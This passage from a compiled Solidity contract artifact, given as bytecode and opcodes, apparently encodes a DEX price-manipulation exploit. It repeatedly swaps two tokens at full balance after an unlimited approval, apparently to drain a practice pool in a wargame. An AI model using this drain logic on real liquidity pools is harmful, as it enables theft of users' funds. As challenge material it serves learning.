16820180604052508101906101f49190610fbb565b5060015460035460405163095ea7b360e01b81526001600160a01b039182166004820152600019602482015291169063095ea7b3906044016020604051808303816000875af115801561024b573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061026f9190610fbb565b506003546000546001546040516370a0823160e01b81523060048201526001600160a01b039384169363df791e5093811692169082906370a0823190602401602060405180830381865afa1580156102cb573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906102ef9190610fdd565b6040518463ffffffff1660e01b815260040161030d93929190610f97565b600060405180830381600087803b15801561032757600080fd5b505af115801561033b573d6000803e3d6000fd5b50506003546001546000546040516370a0823160e01b81523060048201526001600160a01b03938416955063df791e50945091831692169082906370a0823190602401602060405180830381865afa15801561039b573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906103bf9190610fdd565b6040518463ffffffff1660e01b81526004016103dd93929190610f97565b600060405180830381600087803b1580156103f757600080fd5b505af115801561040b573d6000803e3d6000fd5b50506003546000546001546040516370a0823160e01b81523060048201526001600160a01b03938416955063df791e50945091831692169082906370a0823190602401602060405180830381865afa15801561046b573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061048f9190610fdd565b6040518463ffffffff1660e01b81526004016104ad93929190610f97565b600060405180830381600087803b1580156104c757600080fd5b505af11580156104db573d6000803e3d6000fd5b50506003546001546000546040516370a0823160e01b81523060048201526001600160a01b03938416955063df791e50945091831692169082906370a0823190602401602060405180830381865afa15801561053b573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061055f9190610fdd565b6040518463ffffffff1660e01b815260040161057d93929190610f97565b600060405180830381600087803b15801561059757600080fd5b505af11580156105ab573d6000803e3d6000fd5b50506003546000546001546040516370a0823160e01b81523060048201526001600160a01b03938416955063df791e50945091831692169082906370a0823190602401602060405180830381865afa15801561060b573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061062f9190610fdd565b6040518463ffffffff1660e01b815260040161064d93929190610f97565b600060405180830381600087803b15801561066757600080fd5b505af115801561067b573d6000803e3d6000fd5b5050600354600154600054604051630df791e560e41b81526001600160a01b03938416955063df791e5094506106be939283169290911690602d90600401610f97565b600060405180830381600087803b1580156106d857600080fd5b505af11580156106ec573d6000803e3d6000fd5b50506002546003546040516323b872dd60e01b81526001600160a01b0392831694506323b872dd93506107289233921690605a90600401610f97565b6020604051808303816000875af1158015610747573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061076b9190610fbb565b506002546040516323b872dd60e01b81526001600160a01b03909116906323b872dd906107a19033903090605a90600401610f97565b6020604051808303816000875af11580156107c0573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906107e49190610fbb565b5060025460035460405163095ea7b360e01b81526001600160a01b039182166004820152600019602482015291169063095ea7b3906044016020604051808303816000875af115801561083b573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061085f9190610fbb565b506003546002546001546040516370a0823160e01b81523060048201526001600160a01b039384169363df791e5093811692169082906370a0823190602401602060405180830381865afa1580156108bb573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906108df9190610fdd565b6040518463ffffffff1660e01b81526004016108fd93929190610f97565b600060405180830381600087803b15801561091757600080fd5b505af115801561092b573d6000803e3d6000fd5b50505050565b6000546040516323b872dd60e01b81526001600160a01b03909116906323b872dd906109669033903090600a90600401610f97565b6020604051808303816000875af1158015610985573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906109a99190610fbb565b506001546040516323b872dd60e01b81526001600160a01b03909116906323b872dd906109df9033903090600a90600401610f97565b6020604051808303816000875af11580156109fe573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610a229190610fbb565b5060005460035460405163095ea7b360e01b81526001600160a01b039182166004820152600019602482015291169063095ea7b3906044016020604051808303816000875af1158015610a79573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610a9d9190610fbb565b5060015460035460405163095ea7b360e01b81526001600160a01b039182166004820152600019602482015291169063095ea7b3906044016020604051808303816000875af1158015610af4573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610b189190610fbb565b506003546000546001546040516370a0823160e01b81523060048201526001600160a01b039384169363df791e5093811692169082906370a0823190602401602060405180830381865afa158015610b74573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610b989190610fdd565b6040518463ffffffff1660e01b8152600401610bb693929190610f97565b600060405180830381600087803b158015610bd057600080fd5b505af1158015610be4573d6000803e3d6000fd5b50506003546001546000546040516370a0823160e01b81523060048201526001600160a01b03938416955063df791e50945091831692169082906370a0823190602401602060405180830381865afa158015610c44573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610c689190610fdd565b6040518463ffffffff1660e01b8152600401610c8693929190610f97565b600060405180830381600087803b158015610ca057600080fd5b505af1158015610cb4573d6000803e3d6000fd5b50506003546000546001546040516370a0823160e01b81523060048201526001600160a01b03938416955063df791e50945091831692169082906370a0823190602401602060405180830381865afa158015610d14573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610d389190610fdd565b6040518463ffffffff1660e01b8152600401610d5693929190610f97565b600060405180830381600087803b158015610d7057600080fd5b505af1158015610d84573d6000803e3d6000fd5b50506003546001546000546040516370a0823160e01b81523060048201526001600160a01b03938416955063df791e50945091831692169082906370a0823190602401602060405180830381865afa158015610de4573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610e089190610fdd565b6040518463ffffffff1660e01b8152600401610e2693929190610f97565b600060405180830381600087803b158015610e4057600080fd5b505af1158015610e54573d6000803e3d6000fd5b50506003546000546001546040516370a0823160e01b81523060048201526001600160a01b03938416955063df791e50945091831692169082906370a0823190602401602060405180830381865afa158015610eb4573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610ed89190610fdd565b6040518463ffffffff1660e01b8152600401610ef693929190610f97565b600060405180830381600087803b158015610f1057600080fd5b505af1158015610f24573d6000803e3d6000fd5b5050600354600154600054604051630df791e560e41b81526001600160a01b03938416955063df791e5094506108fd939283169290911690602d90600401610f97565b600060208284031215610f7957600080fd5b81356001600160a01b0381168114610f9057600080fd5b9392505050565b6001600160a01b039384168152919092166020820152604081019190915260600190565b600060208284031215610fcd57600080fd5b81518015158114610f9057600080fd5b600060208284031215610fef57600080fd5b505191905056fea2646970667358221220c015545002b616c960000340f211e4b96c1eed86be79a67aef673e97ba5f4b7064736f6c63430008120033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0x110B CODESIZE SUB DUP1 PUSH2 0x110B DUP4 CODECOPY DUP2 ADD PUSH1 0x40 DUP2 SWAP1 MSTORE PUSH2 0x2F SWAP2 PUSH2 0x8D JUMP JUMPDEST PUSH1 0x0 DUP1 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP5 DUP6 AND PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB NOT SWAP2 DUP3 AND OR SWAP1 SWAP2 SSTORE PUSH1 0x1 DUP1 SLOAD SWAP4 DUP6 AND SWAP4 DUP3 AND SWAP4 SWAP1 SWAP4 OR SWAP1 SWAP3 SSTORE PUSH1 0x3 DUP1 SLOAD SWAP2 SWAP1 SWAP4 AND SWAP2 AND OR SWAP1 SSTORE PUSH2 0xD0 JUMP JUMPDEST DUP1 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 AND DUP2 EQ PUSH2 0x88 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 PUSH1 0x60 DUP5 DUP7 SUB SLT ISZERO PUSH2 0xA2 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0xAB DUP5 PUSH2 0x71 JUMP JUMPDEST SWAP3 POP PUSH2 0xB9 PUSH1 0x20 DUP6 ADD PUSH2 0x71 JUMP JUMPDEST SWAP2 POP PUSH2 0xC7 PUSH1 0x40 DUP6 ADD PUSH2 0x71 JUMP JUMPDEST SWAP1 POP SWAP3 POP SWAP3 POP SWAP3 JUMP JUMPDEST PUSH2 0x102C DUP1 PUSH2 0xDF PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x41 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x2216E590 EQ PUSH2 0x46 JUMPI DUP1 PUSH4 0x3E50269C EQ PUSH2 0x78 JUMPI DUP1 PUSH4 0xD7DF8D6F EQ PUSH2 0x80 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x76 PUSH2 0x54 CALLDATASIZE PUSH1 0x4 PUSH2 0xF67 JUMP JUMPDEST PUSH1 0x2 DUP1 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB NOT AND PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP3 SWAP1 SWAP3 AND SWAP2 SWAP1 SWAP2 OR SWAP1 SSTORE JUMP JUMPDEST STOP JUMPDEST PUSH2 0x76 PUSH2 0x88 JUMP JUMPDEST PUSH2 0x76 PUSH2 0x931 JUMP JUMPDEST PUSH1 0x0 SLOAD PUSH1 0x40 MLOAD PUSH4 0x23B872DD PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP2 AND SWAP1 PUSH4 0x23B872DD SWAP1 PUSH2 0xBD SWAP1 CALLER SWAP1 ADDRESS SWAP1 PUSH1 0xA SWAP1 PUSH1 0x4 ADD PUSH2 0xF97 JUMP JUMPDEST PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 GAS CALL ISZERO DUP1 ISZERO PUSH2 0xDC JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x100 SWAP2 SWAP1 PUSH2 0xFBB JUMP JUMPDEST POP PUSH1 0x1 SLOAD PUSH1 0x40 MLOAD PUSH4 0x23B872DD PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP2 AND SWAP1 PUSH4 0x23B872DD SWAP1 PUSH2 0x136 SWAP1 CALLER SWAP1 ADDRESS SWAP1 PUSH1 0xA SWAP1 PUSH1 0x4 ADD PUSH2 0xF97 JUMP JUMPDEST PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 GAS CALL ISZERO DUP1 ISZERO PUSH2 0x155 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x179 SWAP2 SWAP1 PUSH2 0xFBB JUMP JUMPDEST POP PUSH1 0x0 SLOAD PUSH1 0x3 SLOAD PUSH1 0x40 MLOAD PUSH4 0x95EA7B3 PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP2 DUP3 AND PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x0 NOT PUSH1 0x24 DUP3 ADD MSTORE SWAP2 AND SWAP1 PUSH4 0x95EA7B3 SWAP1 PUSH1 0x44 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 GAS CALL ISZERO DUP1 ISZERO PUSH2 0x1D0 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x1F4 SWAP2 SWAP1 PUSH2 0xFBB JUMP JUMPDEST POP PUSH1 0x1 SLOAD PUSH1 0x3 SLOAD PUSH1 0x40 MLOAD PUSH4 0x95EA7B3 PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP2 DUP3 AND PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x0 NOT PUSH1 0x24 DUP3 ADD MSTORE SWAP2 AND SWAP1 PUSH4 0x95EA7B3 SWAP1 PUSH1 0x44 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 GAS CALL ISZERO DUP1 ISZERO PUSH2 0x24B JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x26F SWAP2 SWAP1 PUSH2 0xFBB JUMP JUMPDEST POP PUSH1 0x3 SLOAD PUSH1 0x0 SLOAD PUSH1 0x1 SLOAD PUSH1 0x40 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP4 DUP5 AND SWAP4 PUSH4 0xDF791E50 SWAP4 DUP2 AND SWAP3 AND SWAP1 DUP3 SWAP1 PUSH4 0x70A08231 SWAP1 PUSH1 0x24 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x2CB JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x2EF SWAP2 SWAP1 PUSH2 0xFDD JUMP JUMPDEST PUSH1 0x40 MLOAD DUP5 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x30D SWAP4 SWAP3 SWAP2 SWAP1 PUSH2 0xF97 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x327 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x33B JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP PUSH1 0x3 SLOAD PUSH1 0x1 SLOAD PUSH1 0x0 SLOAD PUSH1 0x40 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP4 DUP5 AND SWAP6 POP PUSH4 0xDF791E50 SWAP5 POP SWAP2 DUP4 AND SWAP3 AND SWAP1 DUP3 SWAP1 PUSH4 0x70A08231 SWAP1 PUSH1 0x24 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x39B JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x3BF SWAP2 SWAP1 PUSH2 0xFDD JUMP JUMPDEST PUSH1 0x40 MLOAD DUP5 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x3DD SWAP4 SWAP3 SWAP2 SWAP1 PUSH2 0xF97 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x3F7 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x40B JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP PUSH1 0x3 SLOAD PUSH1 0x0 SLOAD PUSH1 0x1 SLOAD PUSH1 0x40 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP4 DUP5 AND SWAP6 POP PUSH4 0xDF791E50 SWAP5 POP SWAP2 DUP4 AND SWAP3 AND SWAP1 DUP3 SWAP1 PUSH4 0x70A08231 SWAP1 PUSH1 0x24 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x46B JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x48F SWAP2 SWAP1 PUSH2 0xFDD JUMP JUMPDEST PUSH1 0x40 MLOAD DUP5 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x4AD SWAP4 SWAP3 SWAP2 SWAP1 PUSH2 0xF97 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x4C7 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x4DB JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP PUSH1 0x3 SLOAD PUSH1 0x1 SLOAD PUSH1 0x0 SLOAD PUSH1 0x40 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP4 DUP5 AND SWAP6 POP PUSH4 0xDF791E50 SWAP5 POP SWAP2 DUP4 AND SWAP3 AND SWAP1 DUP3 SWAP1 PUSH4 0x70A08231 SWAP1 PUSH1 0x24 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x53B JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x55F SWAP2 SWAP1 PUSH2 0xFDD JUMP JUMPDEST PUSH1 0x40 MLOAD DUP5 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x57D SWAP4 SWAP3 SWAP2 SWAP1 PUSH2 0xF97 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x597 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x5AB JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP PUSH1 0x3 SLOAD PUSH1 0x0 SLOAD PUSH1 0x1 SLOAD PUSH1 0x40 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP4 DUP5 AND SWAP6 POP PUSH4 0xDF791E50 SWAP5 POP SWAP2 DUP4 AND SWAP3 AND SWAP1 DUP3 SWAP1 PUSH4 0x70A08231 SWAP1 PUSH1 0x24 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x60B JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x62F SWAP2 SWAP1 PUSH2 0xFDD JUMP JUMPDEST PUSH1 0x40 MLOAD DUP5 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x64D SWAP4 SWAP3 SWAP2 SWAP1 PUSH2 0xF97 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x667 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x67B JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP PUSH1 0x3 SLOAD PUSH1 0x1 SLOAD PUSH1 0x0 SLOAD PUSH1 0x40 MLOAD PUSH4 0xDF791E5 PUSH1 0xE4 SHL DUP2 MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP4 DUP5 AND SWAP6 POP PUSH4 0xDF791E50 SWAP5 POP PUSH2 0x6BE SWAP4 SWAP3 DUP4 AND SWAP3 SWAP1 SWAP2 AND SWAP1 PUSH1 0x2D SWAP1 PUSH1 0x4 ADD PUSH2 0xF97 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x6D8 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x6EC JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP PUSH1 0x2 SLOAD PUSH1 0x3 SLOAD PUSH1 0x40 MLOAD PUSH4 0x23B872DD PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP3 DUP4 AND SWAP5 POP PUSH4 0x23B872DD SWAP4 POP PUSH2 0x728 SWAP3 CALLER SWAP3 AND SWAP1 PUSH1 0x5A SWAP1 PUSH1 0x4 ADD PUSH2 0xF97 JUMP JUMPDEST PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 GAS CALL ISZERO DUP1 ISZERO PUSH2 0x747 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x76B SWAP2 SWAP1 PUSH2 0xFBB JUMP JUMPDEST POP PUSH1 0x2 SLOAD PUSH1 0x40 MLOAD PUSH4 0x23B872DD PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP2 AND SWAP1 PUSH4 0x23B872DD SWAP1 PUSH2 0x7A1 SWAP1 CALLER SWAP1 ADDRESS SWAP1 PUSH1 0x5A SWAP1 PUSH1 0x4 ADD PUSH2 0xF97 JUMP JUMPDEST PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 GAS CALL ISZERO DUP1 ISZERO PUSH2 0x7C0 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x7E4 SWAP2 SWAP1 PUSH2 0xFBB JUMP JUMPDEST POP PUSH1 0x2 SLOAD PUSH1 0x3 SLOAD PUSH1 0x40 MLOAD PUSH4 0x95EA7B3 PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP2 DUP3 AND PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x0 NOT PUSH1 0x24 DUP3 ADD MSTORE SWAP2 AND SWAP1 PUSH4 0x95EA7B3 SWAP1 PUSH1 0x44 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 GAS CALL ISZERO DUP1 ISZERO PUSH2 0x83B JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x85F SWAP2 SWAP1 PUSH2 0xFBB JUMP JUMPDEST POP PUSH1 0x3 SLOAD PUSH1 0x2 SLOAD PUSH1 0x1 SLOAD PUSH1 0x40 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP4 DUP5 AND SWAP4 PUSH4 0xDF791E50 SWAP4 DUP2 AND SWAP3 AND SWAP1 DUP3 SWAP1 PUSH4 0x70A08231 SWAP1 PUSH1 0x24 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x8BB JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x8DF SWAP2 SWAP1 PUSH2 0xFDD JUMP JUMPDEST PUSH1 0x40 MLOAD DUP5 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x8FD SWAP4 SWAP3 SWAP2 SWAP1 PUSH2 0xF97 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x917 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x92B JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH1 0x0 SLOAD PUSH1 0x40 MLOAD PUSH4 0x23B872DD 